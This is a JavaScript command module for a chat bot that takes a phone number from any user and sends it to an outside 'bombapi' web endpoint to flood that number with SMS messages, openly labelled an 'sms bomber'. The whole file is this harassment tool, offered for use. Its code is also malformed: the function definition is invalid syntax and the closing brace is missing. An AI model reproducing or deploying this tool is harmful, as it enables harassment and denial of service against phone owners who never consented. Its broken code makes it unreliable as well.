module.exports = {
  config: {
    name: "sms",
    aliases: ["bombing","smsbomber"],
    version: "1.0",
    author: "Amin Shekh",
    countDown: 15,
    role: 0,
    longDescription: "sms bomber bd number",
    category: "Premium",
    guide: {
      en: "{pn} Example:bomber 0137xxxxxxx"
    }
  },

onStart: async function = async ({ api, event, args }) => {
    if (!args[0]) return api.sendMessage("Please enter a phone number that start with 01×××××××××", event.threadID, event.messageID);

    // Display "SMS Bombing Started.." message
    api.sendMessage("SMS Bombing Started..", event.threadID, event.messageID);

    // Making request to the JSON API (assuming you are using Axios)
    const axios = global.nodemodule["axios"];
    let number = args.join(" ");
    await axios.get(`https://bombapi.000webhostapp.com/oggy/api/all.php?phone=${number}`);

    // No need to return any response here
      }
